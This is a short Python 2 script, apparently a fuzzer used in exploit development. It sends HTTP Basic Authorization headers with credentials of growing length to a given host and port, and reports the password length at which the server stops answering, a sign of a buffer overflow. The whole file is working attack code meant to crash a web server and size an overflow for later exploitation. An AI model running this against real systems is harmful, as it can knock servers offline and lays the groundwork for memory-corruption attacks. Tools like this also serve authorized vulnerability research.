import urllib2, base64, httplib, sys

def genCreds(pwLen): 
    pw = ''
    for x in range(0, pwLen):
        pw = pw + 'a'
    print 'PW length: {} - (No base 64): {}'.format(len(pw), pw)
    return base64.encodestring('{}:{}'.format('a', pw)).replace('\n', '')

def main():
    if len(sys.argv) != 3:
        print "Usage: ./genpw.py <address> <port>"
        return 1

    for i in range(134, 256):
        creds = genCreds(i)
        print 'PW length: {} - (Base 64): {}'.format(len(creds), creds)
        url = 'http://{}:{}'.format(sys.argv[1], sys.argv[2])
        request = urllib2.Request(url)
        request.add_header("Authorization", "Basic {}".format(creds))
        try:
            result = urllib2.urlopen(request)
        except urllib2.HTTPError as e:
            print 'Ignoring {}'.format(e)
        except httplib.BadStatusLine as e:
            print 'Crashed server. Possible length of buffer {}'.format(i)
            return 0

if __name__ == '__main__':
    main()
